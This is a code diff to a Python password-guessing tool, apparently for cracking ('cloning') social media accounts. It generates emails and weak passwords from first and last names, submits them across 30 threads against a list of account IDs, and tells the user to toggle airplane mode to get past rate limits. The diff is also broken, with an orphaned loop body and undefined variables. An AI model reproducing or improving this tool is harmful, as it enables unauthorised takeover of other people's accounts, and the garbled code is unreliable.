@@ -394,6 +394,7 @@ class crack_main():
                 os.system("clear");print(logo)
                 import requests,random
                 user=[]
+                passlist = []
                 print(" [*] First Name Example Hamza,Areesha")
                 first = input(" First Name : ")
                 last = input(" Last Name : ")
@@ -411,13 +412,12 @@ class crack_main():
                                 open('mail.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                         uss = open('mail.txt', 'r').read().splitlines()
                 with ThreadPool(max_workers=30) as formSubmit:
-                        total = str(len(zia))
+                        total = str(len(self.id))
                         clear()
                         print(' Total account : \033[1;32m'+total)
                         print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
                         linex()
-                        for user in zia:
-                                ids,names = user.split('|')
+                        
                                 first_name = names.rsplit(' ')[0]
                                 try:
                                         last_name = names.rsplit(' ')[1]
@@ -426,8 +426,14 @@ class crack_main():
                                 fs = first_name.lower()
                                 ls = last_name.lower()
                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-                                with ThreadPool(max_workers=30) as formSubmit:
-                        for user in uss:
+                                os.system('clear')
+                print(logo)
+                print(' Total Ids : '+str(len(self.id)))
+                print(' Cloning Is Started Wait For Results')
+                print(' After Every 5 Min Turn Airplane On/Off')
+                print(50*'=')
+                with ThreadPool(max_workers=30) as formSubmit:
+                        for user in self.id:
                                 iid,name = user.split('|')
                                 formSubmit.submit(self.m1,iid,name,passlist)
                 print(50*'=')
